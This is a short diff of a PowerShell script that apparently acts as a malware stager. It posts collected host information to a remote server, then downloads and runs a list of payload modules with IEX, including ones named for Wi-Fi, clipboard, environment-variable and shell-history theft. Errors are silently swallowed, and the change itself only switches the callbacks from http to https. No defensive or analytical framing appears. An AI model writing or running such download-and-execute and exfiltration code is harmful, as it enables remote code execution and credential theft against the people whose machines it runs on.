@@ -35,7 +35,7 @@ $wc = New-Object Net.WebClient
 $wc.Headers.Add("Authorization", $AU)
 $wc.Headers.Add("Content-Type", "text/plain")
 $wc.Headers.Add("X-Target", $TH)
-try { $wc.UploadString("http://${H}:${P}/store/init", $info) } catch {}
+try { $wc.UploadString("https://${H}:${P}/store/init", $info) } catch {}
 
 # --- run each payload in order, continue if one fails ---
 $payloads = @("recon.ps1", "wifi.ps1", "clipboard.ps1", "envvars.ps1", "history.ps1", "custom.ps1", "clearance.ps1", "mom.ps1")
@@ -44,6 +44,6 @@ foreach ($file in $payloads) {
     try {
         $wc2 = New-Object Net.WebClient
         $wc2.Headers.Add("Authorization", $AU)
-        IEX($wc2.DownloadString("http://${H}:${P}/moduls/$file"))
+        IEX($wc2.DownloadString("https://${H}:${P}/moduls/$file"))
     } catch {}
 }
